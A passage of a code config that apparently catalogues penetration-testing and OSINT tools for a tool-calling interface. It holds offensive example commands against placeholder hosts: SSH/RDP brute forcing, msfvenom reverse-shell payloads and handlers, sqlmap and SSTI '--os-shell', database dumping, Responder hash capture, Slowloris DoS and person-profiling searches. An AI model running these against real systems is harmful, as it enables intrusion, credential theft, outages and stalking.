      { label: 'JS parsing', value: '-u https://example.com -jc' },
      { label: 'Headless mode', value: '-u https://example.com -headless' },
    ],
  },

  // ── Kube-bench ────────────────────────────────────────────────────────────
  run_kube_bench: {
    description: 'Checks Kubernetes cluster configurations against CIS benchmarks. Input is optional node type flag. Output is a list of PASS/FAIL/WARN checks with remediation guidance.',
    hint: 'CIS Kubernetes benchmark compliance checker.',
    examples: [
      { label: 'Run all checks', value: 'run' },
      { label: 'Master checks', value: 'run --targets master' },
      { label: 'Node checks', value: 'run --targets node' },
      { label: 'JSON output', value: 'run --json' },
    ],
  },

  // ── Kube-hunter ───────────────────────────────────────────────────────────
  run_kube_hunter: {
    description: 'Discovers and exploits security weaknesses in Kubernetes clusters. Input is optional target or passive/active mode flag. Output is vulnerabilities found with severity and exploit details.',
    hint: 'Kubernetes cluster vulnerability hunting tool.',
    examples: [
      { label: 'Remote hunt', value: '--remote 192.168.1.1' },
      { label: 'Pod scan', value: '--pod' },
      { label: 'Network scan', value: '--cidr 192.168.1.0/24' },
    ],
  },

  // ── Kubescape ─────────────────────────────────────────────────────────────
  run_kubescape: {
    description: 'Scans Kubernetes configurations and clusters for security risks using multiple frameworks. Input is a framework name or cluster flag. Output is a risk report with control failures and remediation steps.',
    hint: 'Kubernetes security posture management and compliance scanning.',
    examples: [
      { label: 'Scan cluster', value: 'scan' },
      { label: 'NSA framework', value: 'scan framework nsa' },
      { label: 'MITRE ATT&CK', value: 'scan framework mitre' },
      { label: 'Scan manifest', value: 'scan /path/to/manifest.yaml' },
    ],
  },

  // ── Lynis ─────────────────────────────────────────────────────────────────
  run_lynis: {
    description: 'Audits Linux/Unix system security and hardening. Input is optional --audit system flag. Output is a comprehensive security audit with suggestions categorized by severity.',
    hint: 'Unix/Linux security audit and hardening tool.',
    examples: [
      { label: 'Full audit', value: 'audit system' },
      { label: 'Quiet mode', value: 'audit system --quiet' },
      { label: 'Pentest mode', value: 'audit system --pentest' },
    ],
  },

  // ── Maigret ───────────────────────────────────────────────────────────────
  run_maigret: {
    description: "Searches hundreds of websites for a username to build a person's digital footprint. Input is a username. Output is a list of sites where the username exists with profile URLs.",
    hint: 'OSINT username search across 3000+ websites.',
    examples: [
      { label: 'Username search', value: 'johndoe' },
      { label: 'With report', value: 'johndoe --html' },
      { label: 'Top sites', value: 'johndoe --top-sites 500' },
    ],
  },

  // ── Masscan ───────────────────────────────────────────────────────────────
  run_masscan: {
    description: 'Scans the entire internet or large IP ranges for open ports at extremely high speed. Input is an IP range and port with --rate flag. Output is open ports and banners.',
    hint: 'Ultra-fast internet port scanner. Use --rate carefully to avoid network disruption.',
    examples: [
      { label: 'Single host', value: '192.168.1.1 -p 1-65535' },
      { label: 'Subnet top ports', value: '192.168.1.0/24 -p 22,80,443,3389' },
      { label: 'With rate', value: '192.168.1.0/24 -p 1-1000 --rate 1000' },
      { label: 'Banner grab', value: '192.168.1.0/24 -p 80 --banners' },
    ],
  },

  // ── Medusa ────────────────────────────────────────────────────────────────
  run_medusa: {
    description: 'Fast parallel network login brute-forcer. Input is a target host, username, wordlist, and module (ssh, ftp, http). Output is valid credentials found.',
    hint: 'Parallel brute-force login auditor. -h host, -u user, -P passlist, -M module.',
    examples: [
      { label: 'SSH', value: '-h 192.168.1.1 -u admin -P passwords.txt -M ssh' },
      { label: 'FTP', value: '-h 192.168.1.1 -u admin -P passwords.txt -M ftp' },
      { label: 'HTTP basic', value: '-h 192.168.1.1 -u admin -P passwords.txt -M http' },
      { label: 'RDP', value: '-h 192.168.1.1 -u admin -P passwords.txt -M rdp' },
    ],
  },

  // ── Metasploit ────────────────────────────────────────────────────────────
  run_metasploit: {
    description: 'Full-featured penetration testing framework for exploiting known vulnerabilities. Input is an msfconsole command or resource script path. Output is exploitation results, sessions, and post-exploitation data.',
    hint: 'Metasploit Framework — exploit modules, payloads, post-exploitation.',
    examples: [
      { label: 'Search exploit', value: 'search type:exploit name:eternalblue' },
      { label: 'Use module', value: 'use exploit/windows/smb/ms17_010_eternalblue' },
      { label: 'Run msfconsole', value: 'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.1; set LPORT 4444; run"' },
      { label: 'Generate payload', value: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f exe -o payload.exe' },
    ],
  },

  // ── Naabu ─────────────────────────────────────────────────────────────────
  run_naabu: {
    description: 'Fast port scanner focused on reliability. Input is a host or CIDR range with optional port range. Output is open ports per host.',
    hint: 'Fast port scanner written in Go — SYN and CONNECT scan modes.',
    examples: [
      { label: 'Top 100 ports', value: '-host example.com -top-ports 100' },
      { label: 'Full port scan', value: '-host 192.168.1.1 -p -' },
      { label: 'Subnet scan', value: '-host 192.168.1.0/24 -p 22,80,443' },
      { label: 'From file', value: '-list hosts.txt -top-ports 1000' },
    ],
  },

  // Note: naabu-mcp exposes a structured scan_ports tool — not a CLI wrapper.
  scan_ports: {
    description: 'Scans a host or list of hosts for open ports using naabu. Input is one or more hostnames/IPs with optional ports, rate, and scan type. Output is a list of open ports per host.',
    hint: 'Scan ports on target hosts using naabu. Provide hosts as IP, CIDR, or hostname. Optionally specify ports (comma-separated), top_ports count, scan_type (syn/connect), rate, or threads.',
    examples: [
      { label: 'Single host', value: '192.168.1.1' },
      { label: 'CIDR range', value: '192.168.1.0/24' },
      { label: 'Domain', value: 'example.com' },
    ],
  },

  // ── NBTScan ───────────────────────────────────────────────────────────────
  run_nbtscan: {
    description: 'Scans networks for NetBIOS nameservice information on Windows hosts. Input is a network range (e.g. 192.168.1.0/24). Output is hostnames, MAC addresses, and NetBIOS names.',
    hint: 'NetBIOS name scanner for Windows host discovery.',
    examples: [
      { label: 'Subnet scan', value: '192.168.1.0/24' },
      { label: 'Verbose', value: '-v 192.168.1.0/24' },
      { label: 'Single host', value: '192.168.1.1' },
    ],
  },

  // ── Ncrack ────────────────────────────────────────────────────────────────
  run_ncrack: {
    description: 'High-speed network authentication cracker for RDP, SSH, FTP, and more. Input is a target host with service and optional credential lists. Output is cracked credentials.',
    hint: 'Network authentication cracker — high-speed, multi-protocol.',
    examples: [
      { label: 'SSH crack', value: '-u admin -P passwords.txt ssh://192.168.1.1' },
      { label: 'RDP crack', value: '-u administrator -P passwords.txt rdp://192.168.1.1' },
      { label: 'Aggressive', value: '--pairwise -u admin -P passwords.txt ssh://192.168.1.1' },
    ],
  },

  // ── Netcat ────────────────────────────────────────────────────────────────
  run_netcat: {
    description: 'Swiss-army knife for network connections — reads/writes data across TCP/UDP connections. Input is a host and port with optional flags (-l to listen, -e for shell). Output is raw connection data.',
    hint: 'TCP/UDP network utility — banner grabbing, port scanning, file transfer.',
    examples: [
      { label: 'Banner grab', value: '-nv 192.168.1.1 80' },
      { label: 'Port scan', value: '-zvn 192.168.1.1 1-1000' },
      { label: 'Listen mode', value: '-lvnp 4444' },
      { label: 'File transfer', value: '-w 3 192.168.1.1 4444 < file.txt' },
    ],
  },

  // ── Netdiscover ───────────────────────────────────────────────────────────
  run_netdiscover: {
    description: 'Discovers live hosts on a local network using ARP requests. Input is a network interface or range. Output is discovered IP and MAC addresses with vendor info.',
    hint: 'Active/passive ARP reconnaissance for live host discovery.',
    examples: [
      { label: 'Active scan', value: '-r 192.168.1.0/24' },
      { label: 'Passive mode', value: '-p' },
      { label: 'Specific iface', value: '-i eth0 -r 192.168.1.0/24' },
    ],
  },

  // ── Nikto ─────────────────────────────────────────────────────────────────
  run_nikto: {
    description: 'Scans web servers for dangerous files, outdated software, and misconfigurations. Input is a URL or IP with optional port. Output is a list of findings including CVEs, default files, and config issues.',
    hint: 'Web server misconfiguration and vulnerability scanner.',
    examples: [
      { label: 'Basic scan', value: '-h https://example.com' },
      { label: 'Custom port', value: '-h example.com -p 8080' },
      { label: 'SSL scan', value: '-h example.com -ssl' },
      { label: 'Full scan', value: '-h example.com -C all' },
    ],
  },

  // ── Nmap ──────────────────────────────────────────────────────────────────
  run_nmap: {
    description: 'Network port scanner and service fingerprinter. Input is a target IP, hostname, or CIDR range with optional flags (-sV for versions, -A for aggressive, -p for ports). Output is open ports, services, versions, and OS info.',
    hint: 'Network mapper — port scan, service/OS detection, script engine (NSE).',
    examples: [
      { label: 'Quick scan', value: '-F example.com' },
      { label: 'Port range', value: '-p 1-1000 example.com' },
      { label: 'Service versions', value: '-sV example.com' },
      { label: 'OS detection', value: '-O 192.168.1.1' },
      { label: 'Full + scripts', value: '-A -T4 example.com' },
      { label: 'Subnet sweep', value: '-sn 192.168.1.0/24' },
    ],
  },

  // ── NoSQLMap ──────────────────────────────────────────────────────────────
  run_nosqlmap: {
    description: 'Tests NoSQL databases (MongoDB, CouchDB) for injection vulnerabilities. Input is a target URL or connection string. Output is injection vulnerabilities and extracted data.',
    hint: 'Automated NoSQL injection and MongoDB exploitation tool.',
    examples: [
      { label: 'Scan target', value: '--attack 1 --victim 192.168.1.1 --webPort 80' },
      { label: 'MongoDB direct', value: '--attack 2 --victim 192.168.1.1 --mongoPort 27017' },
    ],
  },

  // ── Nuclei ────────────────────────────────────────────────────────────────
  run_nuclei: {
    description: 'Template-based vulnerability scanner covering CVEs, misconfigurations, and exposed panels. Input is a target URL or IP. Output is matched vulnerabilities with CVE IDs, severity, and evidence.',
    hint: 'Template-based vulnerability scanner. Use -t to select template categories.',
    examples: [
      { label: 'Basic scan', value: '-u https://example.com' },
      { label: 'CVE templates', value: '-u https://example.com -t cves/' },
      { label: 'Misconfigs', value: '-u https://example.com -t misconfigurations/' },
      { label: 'Severity filter', value: '-u https://example.com -severity high,critical' },
      { label: 'URL list', value: '-l urls.txt -t cves/' },
    ],
  },

  // ── OnionSearch ───────────────────────────────────────────────────────────
  run_onionsearch: {
    description: 'Searches Tor hidden services for keywords using .onion search engines. Input is a search query. Output is a list of .onion URLs and snippets matching the query.',
    hint: 'Search multiple dark web / .onion search engines.',
    examples: [
      { label: 'Search term', value: 'leaked database' },
      { label: 'Specific engine', value: '--engine ahmia hacking tools' },
    ],
  },

  // ── OpenVAS ───────────────────────────────────────────────────────────────
  run_openvas: {
    description: 'Full vulnerability assessment scanner for networks. Input is a target IP range with optional scan config. Output is a detailed vulnerability report with CVSS scores and remediation steps.',
    hint: 'OpenVAS/GVM vulnerability scanner — comprehensive CVE and config checks.',
    examples: [
      { label: 'Start scan', value: 'start-scan --target 192.168.1.1' },
      { label: 'List reports', value: 'list-reports' },
      { label: 'Full scan', value: 'start-scan --target 192.168.1.0/24 --profile "Full and fast"' },
    ],
  },

  // ── OSV ───────────────────────────────────────────────────────────────────
  query_osv: {
    description: 'Queries the Open Source Vulnerability (OSV) database for vulnerabilities in packages. Input is a package name, version, and ecosystem (e.g. PyPI, npm). Output is matching CVEs and advisories.',
    hint: 'Query the Open Source Vulnerability (OSV) database for package CVEs.',
    examples: [
      { label: 'CVE lookup', value: 'CVE-2021-44228' },
      { label: 'Package vuln', value: 'package log4j ecosystem:Maven' },
    ],
  },

  // ── OTX ───────────────────────────────────────────────────────────────────
  run_otx: {
    description: 'Queries AlienVault OTX threat intelligence for indicators of compromise. Input is an IP, domain, hash, or CVE. Output is threat intelligence including reputation, associated malware, and attack campaigns.',
    hint: 'Query AlienVault OTX threat intelligence for IPs, domains, hashes. Requires API key.',
    examples: [
      { label: 'IP indicators', value: 'ip 8.8.8.8' },
      { label: 'Domain indicators', value: 'domain example.com' },
      { label: 'File hash', value: 'file 44d88612fea8a8f36de82e1278abb02f' },
      { label: 'URL check', value: 'url https://example.com' },
    ],
  },

  // ── PACU ──────────────────────────────────────────────────────────────────
  run_pacu: {
    description: 'AWS exploitation framework for testing cloud security. Input is a Pacu module name and target AWS account. Output is enumerated resources, misconfigurations, and exploitation results.',
    hint: 'AWS exploitation framework — enumerate, escalate, and attack AWS environments.',
    examples: [
      { label: 'Enum services', value: 'run iam__enum_permissions' },
      { label: 'Priv escalation', value: 'run iam__privesc_scan' },
      { label: 'S3 access', value: 'run s3__bucket_finder' },
      { label: 'EC2 enum', value: 'run ec2__enum' },
    ],
  },

  // ── ParamSpider ───────────────────────────────────────────────────────────
  run_paramspider: {
    description: 'Crawls web application and collects URL parameters for testing. Input is a domain name. Output is a list of URLs with parameters extracted from web archives.',
    hint: 'Mine URLs with parameters from web archives for fuzzing.',
    examples: [
      { label: 'Basic mine', value: '-d example.com' },
      { label: 'Include subs', value: '-d example.com --level high' },
      { label: 'Exclude media', value: '-d example.com --exclude woff,css,js' },
    ],
  },

  // ── Patator ───────────────────────────────────────────────────────────────
  run_patator: {
    description: 'Modular brute-force tool for HTTP, SSH, FTP, SMTP, and many other protocols. Input is a module name with target, username, and password parameters. Output is successful authentication attempts.',
    hint: 'Multi-purpose brute-forcer for many protocols.',
    examples: [
      { label: 'SSH brute', value: 'ssh_login host=192.168.1.1 user=admin password=FILE0 0=/usr/share/wordlists/rockyou.txt' },
      { label: 'HTTP basic', value: 'http_fuzz url=http://192.168.1.1/admin user=admin password=FILE0 0=passwords.txt' },
      { label: 'FTP login', value: 'ftp_login host=192.168.1.1 user=admin password=FILE0 0=passwords.txt' },
    ],
  },

  // ── PhoneInfoga ───────────────────────────────────────────────────────────
  run_phoneinfoga: {
    description: 'Gathers intelligence on a phone number including carrier, location, and online presence. Input is a phone number in international format. Output is carrier info, geographic data, and OSINT findings.',
    hint: 'OSINT and phone number reconnaissance.',
    examples: [
      { label: 'Scan number', value: 'scan -n +14155552671' },
      { label: 'Serve UI', value: 'serve' },
    ],
  },

  // ── PixieWPS ──────────────────────────────────────────────────────────────
  run_pixiewps: {
    description: 'Exploits the Pixie Dust WPS vulnerability to recover WiFi WPA keys offline. Input is PKE, PKR, e-hash1, e-hash2 values captured from a WPS exchange. Output is the WPS PIN and WPA key.',
    hint: 'WPS offline brute-force attack (Pixie Dust) tool.',
    examples: [
      { label: 'Pixie dust', value: '-e <PKE> -r <PKR> -s <E-Hash1> -z <E-Hash2> -a <AuthKey> -n <E-Nonce>' },
    ],
  },

  // ── Psudohash ─────────────────────────────────────────────────────────────
  run_psudohash: {
    description: 'Generates a targeted password list based on personal information like names and dates. Input is personal info flags (--name, --birthdate, etc.). Output is a customized wordlist for the target.',
    hint: 'Generate targeted password lists from known information about the target.',
    examples: [
      { label: 'By name/year', value: '-n "John Smith" -y 1990' },
      { label: 'Company-based', value: '-n "Acme Corp" --common-paddings' },
    ],
  },

  // ── Radare2 ───────────────────────────────────────────────────────────────
  run_radare2: {
    description: 'Reverse engineering framework for binary analysis, disassembly, and debugging. Input is a binary file path with optional analysis flags. Output is disassembly, function analysis, and binary metadata.',
    hint: 'Radare2 reverse engineering framework — disassemble, debug, patch binaries.',
    examples: [
      { label: 'Analyse binary', value: '-A /path/to/binary' },
      { label: 'Print functions', value: '-q -c "aaa; afl" /path/to/binary' },
      { label: 'Disassemble fn', value: '-q -c "aaa; pdf @ main" /path/to/binary' },
    ],
  },

  // ── Recon-ng ──────────────────────────────────────────────────────────────
  run_recon_ng: {
    description: 'Modular web reconnaissance framework using OSINT sources. Input is a module name and target domain or keyword. Output is discovered hosts, contacts, credentials, and network data.',
    hint: 'Full-featured web reconnaissance framework with modular architecture.',
    examples: [
      { label: 'Start workspaces', value: 'workspaces create example' },
      { label: 'Subdomain enum', value: 'modules load recon/domains-hosts/brute_hosts; options set SOURCE example.com; run' },
      { label: 'WHOIS lookup', value: 'modules load recon/domains-contacts/whois_pocs; options set SOURCE example.com; run' },
    ],
  },

  // ── Responder ─────────────────────────────────────────────────────────────
  run_responder: {
    description: 'Captures NTLM password hashes by poisoning LLMNR and NBT-NS name resolution. Input is a network interface flag (-I eth0). Output is captured credential hashes from Windows clients.',
    hint: 'LLMNR/NBT-NS/MDNS poisoner for credential capture on local networks.',
    examples: [
      { label: 'Listen on iface', value: '-I eth0' },
      { label: 'Verbose mode', value: '-I eth0 -v' },
      { label: 'Analyse only', value: '-I eth0 -A' },
    ],
  },

  // ── Retire.js ─────────────────────────────────────────────────────────────
  run_retire_js: {
    description: 'Scans web applications for outdated JavaScript libraries with known vulnerabilities. Input is a URL or directory. Output is a list of vulnerable JS libraries with CVE details.',
    hint: 'Detect vulnerable JavaScript libraries in web apps or Node.js projects.',
    examples: [
      { label: 'Scan JS dir', value: '--path /path/to/js/files' },
      { label: 'Scan URL', value: '--url https://example.com' },
      { label: 'Node project', value: '--node --path /path/to/project' },
    ],
  },

  // ── ROADtools ─────────────────────────────────────────────────────────────
  run_roadtools: {
    description: 'Enumerates and analyzes Azure AD (Entra ID) tenants and their configurations. Input is a command (auth, dump, gui) with optional tenant credentials. Output is Azure AD users, groups, apps, and access policies.',
    hint: 'Azure AD / Entra ID attack and enumeration toolkit.',
    examples: [
      { label: 'Auth device flow', value: 'auth --device-code' },
      { label: 'Dump tenant', value: 'dump' },
      { label: 'ROADrecon GUI', value: 'gui' },
    ],
  },

  // ── ROPgadget ─────────────────────────────────────────────────────────────
  run_ropgadget: {
    description: 'Finds ROP (Return-Oriented Programming) gadgets in binaries for exploit development. Input is a binary file path. Output is a list of gadget addresses and assembly instructions.',
    hint: 'Find ROP (Return Oriented Programming) gadgets in binaries.',
    examples: [
      { label: 'Find gadgets', value: '--binary /path/to/binary' },
      { label: 'ROPchain', value: '--binary /path/to/binary --rop --thumb' },
      { label: 'Filter gadgets', value: '--binary /path/to/binary --re "pop rdi"' },
    ],
  },

  // ── Ropper ────────────────────────────────────────────────────────────────
  run_ropper: {
    description: 'Searches binaries for ROP gadgets and generates ROP chains for exploit development. Input is a binary file with optional gadget search term. Output is gadget list with addresses.',
    hint: 'Find ROP/JOP/SYS gadgets and generate ROP chains.',
    examples: [
      { label: 'Find gadgets', value: '--file /path/to/binary' },
      { label: 'Filter type', value: '--file /path/to/binary --type rop' },
      { label: 'Search gadget', value: '--file /path/to/binary --search "pop rdi"' },
    ],
  },

  // ── RustScan ──────────────────────────────────────────────────────────────
  run_rustscan: {
    description: 'Ultra-fast port scanner that finds open ports and pipes them to nmap. Input is a target IP or range with optional port range. Output is open ports, then nmap service details.',
    hint: 'Blazing-fast port scanner — pipes results to Nmap for service detection.',
    examples: [
      { label: 'Fast scan', value: '-a 192.168.1.1' },
      { label: 'With nmap', value: '-a 192.168.1.1 -- -sV -sC' },
      { label: 'Port range', value: '-a 192.168.1.1 -p 1-10000' },
      { label: 'Subnet', value: '-a 192.168.1.0/24 --ulimit 5000' },
    ],
  },

  // ── ScoutSuite ────────────────────────────────────────────────────────────
  run_scoutsuite: {
    description: 'Multi-cloud security auditing tool for AWS, Azure, and GCP. Input is a cloud provider flag and credentials. Output is a security report with misconfigurations, exposed resources, and risk ratings.',
    hint: 'Multi-cloud security auditing tool for AWS, GCP, Azure, OCI.',
    examples: [
      { label: 'AWS audit', value: 'aws' },
      { label: 'GCP audit', value: 'gcp --user-account' },
      { label: 'Azure audit', value: 'azure --cli' },
    ],
  },

  // ── Semgrep ───────────────────────────────────────────────────────────────
  run_semgrep: {
    description: 'Static analysis tool for finding security vulnerabilities and code quality issues in source code. Input is a target directory or file with optional ruleset. Output is matched findings with code snippets.',
    hint: 'Static analysis for finding bugs and security issues in source code.',
    examples: [
      { label: 'Auto rules', value: '--config auto /path/to/project' },
      { label: 'Security rules', value: '--config "p/security-audit" /path/to/project' },
      { label: 'OWASP rules', value: '--config "p/owasp-top-ten" /path/to/project' },
      { label: 'JSON output', value: '--config auto --json /path/to/project' },
    ],
  },

  // ── Sherlock ──────────────────────────────────────────────────────────────
  run_sherlock: {
    description: 'Hunts for a username across 300+ social networks. Input is a username. Output is a list of sites where the username was found with direct profile URLs.',
    hint: 'Hunt down social media accounts by username across 300+ sites.',
    examples: [
      { label: 'Username search', value: 'johndoe' },
      { label: 'Multiple usernames', value: 'johndoe janedoe' },
      { label: 'Print found only', value: '--print-found johndoe' },
    ],
  },

  // ── Shodan ────────────────────────────────────────────────────────────────
  run_shodan: {
    description: 'Queries the Shodan internet device search engine. Input is Shodan CLI flags (search, host, count, etc.) with a query string. Output is device listings with IPs, banners, and vulnerability tags.',
    hint: 'Shodan internet-wide search. Requires Shodan API key. Use shodan query syntax.',
    examples: [
      { label: 'Host info', value: 'host 8.8.8.8' },
      { label: 'Search apache', value: 'search apache country:US' },
      { label: 'Open RDP', value: 'search port:3389 has_screenshot:true' },
      { label: 'Industrial ICS', value: 'search product:simatic' },
      { label: 'Count results', value: 'count apache' },
    ],
  },

  // Note: shodan-mcp only exposes a status/info tool — no search or host lookup.
  shodan_info: {
    description: 'Returns account information and API credit balance for the configured Shodan account. No input required.',
    hint: 'Returns basic status and info for the Shodan MCP server. No arguments required.',
    examples: [],
  },

  // ── ShuffleDNS ────────────────────────────────────────────────────────────
  run_shuffledns: {
    description: 'Resolves and brute-forces subdomains using massdns at high speed. Input is a domain name and optional wordlist. Output is a list of valid, resolved subdomains.',
    hint: 'Mass DNS resolver and subdomain brute-forcer using massdns.',
    examples: [
      { label: 'Brute-force', value: '-d example.com -w subdomains.txt -r resolvers.txt' },
      { label: 'Resolve list', value: '-list subdomains.txt -r resolvers.txt' },
    ],
  },

  // ── SlowHTTPTest ──────────────────────────────────────────────────────────
  run_slowhttptest: {
    description: 'Tests web servers for Slow HTTP DoS vulnerabilities (Slowloris, RUDY, slow read). Input is a target URL with attack type flags. Output is server vulnerability status and connection behavior.',
    hint: 'Slow HTTP DoS test — Slowloris, slow POST, slow read attacks.',
    examples: [
      { label: 'Slowloris', value: '-c 1000 -H -g -o report -i 10 -l 120 -u https://example.com' },
      { label: 'Slow POST', value: '-c 3000 -B -g -o report -i 110 -l 120 -u https://example.com' },
      { label: 'Slow read', value: '-c 8000 -X -g -o report -u https://example.com' },
    ],
  },

  // ── SMBMap ────────────────────────────────────────────────────────────────
  run_smbmap: {
    description: 'Enumerates SMB shares on Windows hosts and checks access permissions. Input is a target IP with optional credentials. Output is a list of shares with read/write access status.',
    hint: 'Enumerate Samba share drives and permissions.',
    examples: [
      { label: 'Null session', value: '-H 192.168.1.1' },
      { label: 'With creds', value: '-H 192.168.1.1 -u admin -p password' },
      { label: 'Domain creds', value: '-H 192.168.1.1 -d DOMAIN -u admin -p password' },
      { label: 'Download file', value: '-H 192.168.1.1 -u admin -p password -A ".*\\.txt" -r' },
    ],
  },

  // ── SMTP User Enum ────────────────────────────────────────────────────────
  run_smtp_user_enum: {
    description: 'Enumerates valid email usernames on an SMTP server via VRFY, EXPN, or RCPT commands. Input is a target mail server and username list. Output is valid email addresses found.',
    hint: 'Enumerate valid SMTP users via VRFY, EXPN, or RCPT TO.',
    examples: [
      { label: 'VRFY mode', value: '-M VRFY -U users.txt -t 192.168.1.1' },
      { label: 'RCPT mode', value: '-M RCPT -U users.txt -t 192.168.1.1 -f admin@example.com' },
      { label: 'Single user', value: '-M VRFY -u admin -t 192.168.1.1' },
    ],
  },

  // ── Smuggler ──────────────────────────────────────────────────────────────
  run_smuggler: {
    description: 'Tests web servers and proxies for HTTP request smuggling vulnerabilities. Input is a target URL. Output is detected request smuggling vectors and server behavior.',
    hint: 'Detect HTTP request smuggling vulnerabilities (CL.TE, TE.CL, TE.TE).',
    examples: [
      { label: 'Scan target', value: '-u https://example.com' },
      { label: 'All techniques', value: '-u https://example.com --all-techniques' },
    ],
  },

  // ── Social Analyzer ───────────────────────────────────────────────────────
  run_social_analyzer: {
    description: 'Analyzes a person across 1000+ social media platforms using a username or name. Input is a username with optional platform flags. Output is profile links and aggregated social media presence.',
    hint: 'Analyse social media presence and detect profiles by username.',
    examples: [
      { label: 'Username search', value: '--username johndoe --metadata' },
      { label: 'Fast search', value: '--username johndoe --mode fast' },
    ],
  },

  // ── SpiderFoot ────────────────────────────────────────────────────────────
  run_spiderfoot: {
    description: 'Automated OSINT framework that collects intelligence on IPs, domains, email, and people. Input is a target with module flags. Output is a comprehensive intelligence report.',
    hint: 'Automated OSINT reconnaissance tool — 200+ data sources.',
    examples: [
      { label: 'Scan domain', value: '-s example.com -t INTERNET_NAME' },
      { label: 'Scan IP', value: '-s 192.168.1.1 -t IP_ADDRESS' },
      { label: 'All modules', value: '-s example.com -m all' },
    ],
  },

  // ── SQLMap ────────────────────────────────────────────────────────────────
  run_sqlmap: {
    description: 'Detects and exploits SQL injection vulnerabilities in web applications. Input is a target URL with optional parameter or POST data flags. Output is injection vulnerability details and extracted database contents.',
    hint: 'Automated SQL injection detection and exploitation.',
    examples: [
      { label: 'Basic URL test', value: '-u "https://example.com/page?id=1"' },
      { label: 'POST data', value: '-u "https://example.com/login" --data "user=admin&pass=test"' },
      { label: 'Enumerate DBs', value: '-u "https://example.com/page?id=1" --dbs' },
      { label: 'Dump table', value: '-u "https://example.com/page?id=1" -D mydb -T users --dump' },
      { label: 'OS shell', value: '-u "https://example.com/page?id=1" --os-shell' },
    ],
  },

  // ── SSLScan ───────────────────────────────────────────────────────────────
  run_sslscan: {
    description: 'Scans SSL/TLS configurations on a server for weak ciphers, outdated protocols, and certificate issues. Input is a hostname and port. Output is a table of supported ciphers, protocols, and certificate details.',
    hint: 'Test SSL/TLS configuration and cipher suites.',
    examples: [
      { label: 'Basic scan', value: 'example.com' },
      { label: 'Custom port', value: '--port=8443 example.com' },
      { label: 'No colour', value: '--no-colour example.com' },
      { label: 'Show certs', value: '--show-certificate example.com' },
    ],
  },

  // ── SSLyze ────────────────────────────────────────────────────────────────
  run_sslyze: {
    description: 'Analyzes SSL/TLS configuration for security weaknesses. Input is a hostname with optional port. Output is cipher suites, protocol support, certificate validity, and specific vulnerabilities.',
    hint: 'Fast SSL/TLS server configuration analyser.',
    examples: [
      { label: 'Full scan', value: 'example.com' },
      { label: 'Custom port', value: 'example.com:8443' },
      { label: 'JSON output', value: '--json_out report.json example.com' },
      { label: 'Heartbleed', value: '--heartbleed example.com' },
    ],
  },

  // ── SSTImap ───────────────────────────────────────────────────────────────
  run_sstimap: {
    description: 'Detects and exploits Server-Side Template Injection (SSTI) vulnerabilities. Input is a target URL with optional POST data. Output is vulnerable template engines and optional shell access.',
    hint: 'Server-Side Template Injection (SSTI) detection and exploitation.',
    examples: [
      { label: 'Scan URL', value: '-u https://example.com/page?name=test' },
      { label: 'POST data', value: '-u https://example.com/render --data "template=test"' },
      { label: 'OS shell', value: '-u https://example.com/page?name=test --os-shell' },
    ],
  },

  // ── Steghide ──────────────────────────────────────────────────────────────
  run_steghide: {
    description: 'Hides or extracts data embedded in image and audio files (steganography). Input is a cover file with embed/extract flag and optional passphrase. Output is the hidden message or the stego file.',
    hint: 'Steganography — embed or extract data hidden in image/audio files.',
    examples: [
      { label: 'Extract data', value: 'extract -sf image.jpg' },
      { label: 'Embed data', value: 'embed -cf image.jpg -ef secret.txt -p password' },
      { label: 'Info about file', value: 'info image.jpg' },
    ],
  },

  // ── Subfinder ─────────────────────────────────────────────────────────────
  run_subfinder: {
    description: 'Passive subdomain discovery using certificate transparency, DNS, and third-party APIs. Input is a domain name. Output is a list of discovered subdomains.',
    hint: 'Fast passive subdomain discovery using 40+ passive sources.',
    examples: [
      { label: 'Basic enum', value: '-d example.com' },
      { label: 'All sources', value: '-d example.com -all' },
      { label: 'Silent output', value: '-d example.com -silent' },
      { label: 'Multiple domains', value: '-dL domains.txt' },
    ],
  },

  // ── Sublist3r ─────────────────────────────────────────────────────────────
  run_sublist3r: {
    description: 'Enumerates subdomains using search engines and DNS brute force. Input is a domain name with optional brute-force flag. Output is a list of discovered subdomains.',
    hint: 'Subdomain enumeration using search engines and DNS.',
    examples: [
      { label: 'Basic enum', value: '-d example.com' },
      { label: 'With brute', value: '-d example.com -b -w wordlist.txt' },
      { label: 'Save output', value: '-d example.com -o subdomains.txt' },
    ],
  },

  // ── Suricata ──────────────────────────────────────────────────────────────
  run_suricata: {
    description: 'Network intrusion detection/prevention system that inspects traffic against threat signatures. Input is a pcap file or interface with rule set. Output is alerts for detected threats with severity and rule details.',
    hint: 'Network IDS/IPS — analyse pcap files or monitor live traffic.',
    examples: [
      { label: 'Analyse pcap', value: '-r /path/to/capture.pcap -l /var/log/suricata/' },
      { label: 'Live monitor', value: '-i eth0' },
      { label: 'Test rules', value: '-T -c /etc/suricata/suricata.yaml' },
    ],
  },

  // ── Syft ──────────────────────────────────────────────────────────────────
  run_syft: {
    description: 'Generates a Software Bill of Materials (SBOM) from container images and filesystems. Input is an image name or directory path. Output is a list of all packages and libraries with versions.',
    hint: 'Generate Software Bill of Materials (SBOM) for containers and filesystems.',
    examples: [
      { label: 'Docker image', value: 'ubuntu:22.04' },
      { label: 'Local dir', value: 'dir:/path/to/project' },
      { label: 'SPDX format', value: 'ubuntu:22.04 -o spdx-json' },
      { label: 'CycloneDX', value: 'ubuntu:22.04 -o cyclonedx-json' },
    ],
  },

  // ── Testssl.sh ────────────────────────────────────────────────────────────
  run_testssl: {
    description: 'Tests SSL/TLS endpoints for vulnerabilities including BEAST, POODLE, Heartbleed, and cipher weaknesses. Input is a hostname and port. Output is a detailed report of TLS configuration and vulnerabilities.',
    hint: 'Comprehensive SSL/TLS testing script.',
    examples: [
      { label: 'Full test', value: 'example.com' },
      { label: 'Custom port', value: 'example.com:8443' },
      { label: 'Severity warn', value: '--severity WARN example.com' },
      { label: 'JSON output', value: '--jsonfile report.json example.com' },
    ],
  },

  // ── theHarvester ──────────────────────────────────────────────────────────
  run_theharvester: {
    description: 'Gathers emails, subdomains, IPs, and names from public sources like Google, LinkedIn, and Shodan. Input is a domain name with optional source and limit flags. Output is collected OSINT data.',
    hint: 'OSINT gathering — emails, subdomains, IPs from search engines and sources.',
    examples: [
      { label: 'Google search', value: '-d example.com -b google' },
      { label: 'All sources', value: '-d example.com -b all' },
      { label: 'LinkedIn', value: '-d example.com -b linkedin' },
      { label: 'DNS brute', value: '-d example.com -b dnsdumpster -f report' },
